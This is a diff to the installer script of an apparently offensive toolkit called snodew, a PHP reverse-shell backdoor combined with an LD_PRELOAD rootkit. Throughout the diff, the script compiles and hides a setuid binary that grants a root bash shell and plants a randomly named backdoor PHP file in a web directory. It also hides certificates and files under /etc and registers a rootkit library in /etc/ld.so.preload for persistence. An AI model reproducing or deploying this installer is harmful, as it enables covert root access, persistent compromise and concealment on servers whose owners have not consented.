@@ -8,11 +8,16 @@ WWWNAME="www-data"
 SECRET_PORT="" # if this is empty a random value is used instead
 
 # by default use socat.ssl.php. change if you want.
-# if using socat.ssl.php, you need to use src/gencert.sh first.
+# if using socat.ssl.php, you need to use src/ssl/gencert.sh first.
 SNODEW_LOC="src/snodew.socat.ssl.php"
 #SNODEW_LOC="src/snodew.socat.php"
 #SNODEW_LOC="src/snodew.ncat.php"
 
+MSGPATH="src/.interactive_shellmsg" # the contents of this file are shown to you
+                                    # upon successfully receiving your reverse shell
+                                    # (only works if it's an interactive shell)
+
+tty -s && clear
 [ -f .ascii ] && printf "\e[32m`cat .ascii`\e[0m" && echo
 
 secho(){ echo -e " [\e[32m+\e[0m] $1"; }
@@ -47,17 +52,13 @@ fi
     eecho "no passwd entry for $WWWNAME"; \
     exit; \
 }
-usage(){
-    echo " usage: $0 [install dir] [password]"
-    exit
-}
-# usage: show_info [install dir] [hashed password] [suid bin location] [magic gid] [secret port]
+usage(){ echo " usage: $0 [install dir] [password]"; exit; }
+# usage: show_info [install dir] [suid bin location] [magic gid] [secret port]
 show_info(){
     echo -e " [..] installation directory: \e[32m$1\e[0m"
-    echo -e " [..] hashed password: $2"
-    echo -e " [..] suid bin location: $3"
-    echo -e " [..] magic gid: $4"
-    echo -e " [..] secret port: \e[32m$5\e[0m"
+    echo -e " [..] suid bin location: $2"
+    echo -e " [..] magic gid: $3"
+    echo -e " [..] secret port: \e[32m$4\e[0m"
 }
 random(){ echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
 # usage: hash_password [password]
@@ -78,24 +79,32 @@ get_userinfo(){ # $1 = username
 # compiles small program that runs /bin/sh after setting our gid to our magic gid.
 # then hides it & gives it suid permissions.
 setup_backdoor(){
-    # we interactive shell nao
-    printf "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);putenv(\"TERM=xterm\");printf(\"i'm fuckin gay lmao\\\n\");execl(\"/bin/bash\",\"bash\",\"-li\",0);return 0;}" > bd.c
+    echo " [..] setting up suid binary for backdoor privesc"
+    # setup welcome for backdoor
+    NEW_MSGPATH="/etc/motd" #lol
+    [ -z $COMPILE_ONLY ] && NEW_MSGPATH="/etc/`random 'a-z' 6`"
+    [ -z $COMPILE_ONLY ] && { cp $MSGPATH $NEW_MSGPATH && hide_file $NEW_MSGPATH; }
 
-    echo " [..] compiling suid binary"
-    gcc bd.c -o $1 || { eecho "couldn't compile binary"; exit; }
-    rm bd.c
+    local output="$1"
+    [ ! -z $COMPILE_ONLY ] && output="./bd"
+    printf "#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);system(\"cat $NEW_MSGPATH 2>/dev/null; id\");execl(\"/bin/bash\",\"bash\",\"-li\",0);return 0;}" > bd.c
 
-    [ -z $NO_ROOTKIT ] && secho "hiding compiled binary"
-    hide_file $1
+    echo " [..] compiling"
+    gcc bd.c -o $output
+    [ -z $COMPILE_ONLY ] && rm bd.c
 
-    secho "assigning suid bit to binary"
-    chmod u+s $1 || { eecho "couldn't assign suid bit to $1"; exit; }
+    [ -z $NO_ROOTKIT ] && echo " [..] hiding"
+    hide_file $output
+
+    [ `id -u` == 0 ] && echo " [..] assigning suid bit"
+    [ `id -u` == 0 ] && { chmod u+s $output || { eecho "couldn't assign suid bit to $output"; exit; }; }
+    secho "finished setting up suid binary"
 }
 
 # usage:
 # config_snodew [hashed password] [suid bin location] [install dir]
 config_snodew(){
-    secho "configuring snodew"
+    echo " [..] configuring snodew"
     cp $SNODEW_LOC ${SNODEW_LOC}.bak
     sed -i "s:_PASS_:$1:" $SNODEW_LOC
     sed -i "s:_SUID_BIN_:$2:" $SNODEW_LOC
@@ -103,7 +112,7 @@ config_snodew(){
     sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $SNODEW_LOC
 
     if [ ! -z $DO_SSL ]; then   # first, copy cert somewhere & hide it
-        secho "setting up ssl cert for the backdoor"
+        echo " [..] setting up ssl cert for the backdoor"
 
         NCLIENTPEM="/etc/`random 'a-z' 6`.pem"
         NSERVERCRT="/etc/`random 'a-z' 6`.crt"
@@ -113,8 +122,7 @@ config_snodew(){
         hide_file $NCLIENTPEM
         hide_file $NSERVERCRT
 
-        secho "files copied & hidden successfully"
-        secho "writing new cert paths to $SNODEW_LOC"
+        echo " [..] writing new cert paths to $SNODEW_LOC"
         sed -i "s:_SERVERCRTPATH_:$NSERVERCRT:" $SNODEW_LOC
         sed -i "s:_CLIENTPEMPATH_:$NCLIENTPEM:" $SNODEW_LOC
         secho "done configuring ssl settings"
@@ -122,7 +130,7 @@ config_snodew(){
 
     PHP_NEWFILENAME="`random 'a-z' 6`.php"
     PHP_LOCATION="$3/$PHP_NEWFILENAME"
-    [ -z $COMPILE_ONLY ] && echo " [+] moving and hiding snodew php script to specified directory"
+    [ -z $COMPILE_ONLY ] && echo " [..] moving php script"
     [ -z $COMPILE_ONLY ] && mv $SNODEW_LOC $PHP_LOCATION
     mv ${SNODEW_LOC}.bak $SNODEW_LOC
     hide_file $PHP_LOCATION
@@ -141,10 +149,10 @@ PASS="$(hash_password $2)"
 SUID_BIN="/lib/init.`random '1-4' 1`"
 MAGIC_GID=`random '1-9' 3`
 MAGIC_VAR="`random 'A-Z' 7`"
-show_info $INSTALL_DIR $PASS $SUID_BIN $MAGIC_GID $SECRET_PORT; echo
+show_info $INSTALL_DIR $SUID_BIN $MAGIC_GID $SECRET_PORT; echo
 
-[ -z $COMPILE_ONLY ] && setup_backdoor $SUID_BIN
-config_snodew $PASS $SUID_BIN $INSTALL_DIR
+setup_backdoor $SUID_BIN
+echo; config_snodew $PASS $SUID_BIN $INSTALL_DIR
 
 echo
 [ ! -z $COMPILE_ONLY ] && secho "completed setting up snodew php backdoor"
@@ -160,13 +168,14 @@ cp $CONF_H ${CONF_H}.bak
 
 SOPATH="/lib/libc.so.`random '1-9' 2`"
 PRELOAD="/etc/ld.so.preload"
-secho "magic variable: \e[32m$MAGIC_VAR\e[0m"
+printf " [..] magic variable: \e[32m$MAGIC_VAR\e[0m\n"
 sed -i "s:_MAGIC_GID_:$MAGIC_GID:" $CONF_H
 sed -i "s:_MAGIC_VAR_:$MAGIC_VAR:" $CONF_H
 sed -i "s:_SUID_BIN_:$SUID_BIN:" $CONF_H
 sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $CONF_H
 sed -i "s:_PHP_LOCATION_:$PHP_LOCATION:" $CONF_H
 sed -i "s:_PHP_NEWFILENAME_:$PHP_NEWFILENAME:" $CONF_H
+sed -i "s:_MSGPATH_:$NEW_MSGPATH:" $CONF_H
 sed -i "s:_SOPATH_:$SOPATH:" $CONF_H
 sed -i "s:_PRELOAD_:$PRELOAD:" $CONF_H
 
@@ -178,7 +187,7 @@ sed -i "s:_WWWNAME_:$WWWNAME:" $CONF_H
 sed -i "s:_WWWHOME_:$WWWHOME:" $CONF_H
 
 if [ ! -z $DO_SSL ]; then
-    secho "writing ssl cert paths to rootkit header file"
+    echo " [..] writing ssl cert paths to rootkit header file"
     echo "#define CLIENTPEM \"$NCLIENTPEM\"" >> $CONF_H
     echo "#define SERVERCRT \"$NSERVERCRT\"" >> $CONF_H
 fi
@@ -201,4 +210,4 @@ echo -n "$SOPATH" > $PRELOAD
 hide_file $PRELOAD
 
 secho "rootkit installation successful"
-secho "restart the service asap"
+secho "restart the service now"
